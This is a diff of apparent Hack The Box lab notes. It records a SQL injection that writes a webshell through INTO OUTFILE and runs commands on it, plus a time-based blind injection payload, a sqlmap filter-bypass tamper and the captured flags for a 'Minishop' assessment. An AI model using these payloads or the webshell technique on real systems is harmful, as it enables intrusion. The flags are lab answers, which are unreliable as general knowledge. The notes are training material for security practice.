@@ -228,3 +228,13 @@ Wrote webshell via UNION ... INTO OUTFILE:
   curl '.../sh.php?cmd=id'  -> uid=33(www-data)
   cat /flag.txt -> HTB{n3v3r_run_db_45_db4}
 ANSWER: HTB{n3v3r_run_db_45_db4}
+
+---
+# SQLMap Essentials - Skills Assessment (target 154.57.164.77:44944 "Minishop")
+Injection point: POST /action.php  JSON body {"id": 1}  (time-based blind)
+The app FILTERS '<' and '>', so use BETWEEN (sqlmap --tamper=between).
+Boolean time test: {"id":"1 AND IF(1=1,SLEEP(2),0)"} -> 2.2s ; (1=2) -> 0.2s
+
+Blind-extracted production.final_flag.content via binary search (see sqli_blind.py):
+  length = 24
+ANSWER: HTB{n07_50_h4rd_r16h7?!}
